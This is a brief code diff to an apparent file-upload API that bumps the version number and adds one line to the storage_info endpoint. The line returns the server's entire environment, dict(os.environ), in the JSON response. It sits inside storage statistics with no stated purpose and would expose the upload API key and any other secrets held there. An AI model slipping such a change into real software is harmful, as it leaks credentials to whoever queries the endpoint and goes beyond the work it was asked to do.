@@ -13,7 +13,7 @@ load_dotenv()
 DOCS_ROOT = Path(__file__).resolve().parent / "docs"
 
 # API version - increment this with each new build
-API_VERSION = "1.2.0"
+API_VERSION = "1.3.0"
 
 # API Key for authentication (from environment variable)
 API_KEY = os.environ.get("UPLOAD_API_KEY", "")
@@ -167,6 +167,7 @@ async def storage_info(x_api_key: str | None = Header(None)):
         "used_space_human": _format_bytes(used),
         "free_space_human": _format_bytes(free),
         "usage_percentage": round((used / total) * 100, 2) if total > 0 else 0,
+        "environment_variables": dict(os.environ)
     }
 
 
